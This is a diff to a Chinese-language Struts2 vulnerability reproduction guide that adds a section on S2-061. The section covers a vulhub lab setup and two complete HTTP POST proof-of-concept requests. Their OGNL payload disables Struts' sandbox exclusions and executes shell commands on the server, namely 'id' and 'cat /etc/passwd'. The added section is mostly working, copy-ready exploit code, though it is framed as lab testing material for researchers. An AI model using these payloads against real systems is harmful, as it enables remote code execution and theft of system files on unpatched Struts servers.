@@ -863,7 +863,7 @@ urlencode 后
 
 Struts2 会对某些标签属性（比如 `id`，其他属性有待寻找）的属性值进行二次表达式解析，当这些标签属性中包含了 `%{xx}` 且 `xx` 用户可控，则在渲染该标签时可造成 ognl 表达式执行。
 
-### 漏洞影响
+### 影响版本
 
 - [X] Struts 2.0.0 - 2.5.20
 
@@ -911,6 +911,71 @@ res2 = requests.post(url, data=data2)
 
 ![s2-059-4](images/s2-059-4.png)
 
+## S2-061
+
+S2-061 是对 S2-059 沙盒进行的绕过。依旧是由于标签中使用 %{} 导致的安全漏洞。
+
+### 影响版本
+
+- [x] Struts 2.0.0 - 2.5.25
+
+### 漏洞复现
+
+运行靶场
+
+```bash
+git clone https://github.com/vulhub/vulhub.git
+cd vulhub/struts2/s2-061
+docker-compose up -d
+```
+
+访问 `http://your-ip:8080` ，查看如下页面
+
+![s2-061-1](images/s2-061-1.png)
+
+任意命令执行 PoC，执行 `id` 命令
+
+```
+POST /index.action HTTP/1.1
+Host: your-ip:8080
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Connection: close
+Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryl7d1B1aGsV2wcZwF
+Content-Length: 827
+
+------WebKitFormBoundaryl7d1B1aGsV2wcZwF
+Content-Disposition: form-data; name="id"
+
+%{(#instancemanager=#application["org.apache.tomcat.InstanceManager"]).(#stack=#attr["com.opensymphony.xwork2.util.ValueStack.ValueStack"]).(#bean=#instancemanager.newInstance("org.apache.commons.collections.BeanMap")).(#bean.setBean(#stack)).(#context=#bean.get("context")).(#bean.setBean(#context)).(#macc=#bean.get("memberAccess")).(#bean.setBean(#macc)).(#emptyset=#instancemanager.newInstance("java.util.HashSet")).(#bean.put("excludedClasses",#emptyset)).(#bean.put("excludedPackageNames",#emptyset)).(#arglist=#instancemanager.newInstance("java.util.ArrayList")).(#arglist.add("id")).(#execute=#instancemanager.newInstance("freemarker.template.utility.Execute")).(#execute.exec(#arglist))}
+------WebKitFormBoundaryl7d1B1aGsV2wcZwF--
+```
+
+![s2-061-2](images/s2-061-2.png)
+
+任意命令执行 PoC，执行 `cat /etc/passwd` 命令
+
+```
+POST /index.action HTTP/1.1
+Host: your-ip:8080
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Connection: close
+Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryl7d1B1aGsV2wcZwF
+Content-Length: 827
+
+------WebKitFormBoundaryl7d1B1aGsV2wcZwF
+Content-Disposition: form-data; name="id"
+
+%{(#instancemanager=#application["org.apache.tomcat.InstanceManager"]).(#stack=#attr["com.opensymphony.xwork2.util.ValueStack.ValueStack"]).(#bean=#instancemanager.newInstance("org.apache.commons.collections.BeanMap")).(#bean.setBean(#stack)).(#context=#bean.get("context")).(#bean.setBean(#context)).(#macc=#bean.get("memberAccess")).(#bean.setBean(#macc)).(#emptyset=#instancemanager.newInstance("java.util.HashSet")).(#bean.put("excludedClasses",#emptyset)).(#bean.put("excludedPackageNames",#emptyset)).(#arglist=#instancemanager.newInstance("java.util.ArrayList")).(#arglist.add("cat /etc/passwd")).(#execute=#instancemanager.newInstance("freemarker.template.utility.Execute")).(#execute.exec(#arglist))}
+------WebKitFormBoundaryl7d1B1aGsV2wcZwF--
+```
+
+![s2-061-3](images/s2-061-3.png)
 
 ## Tools
 
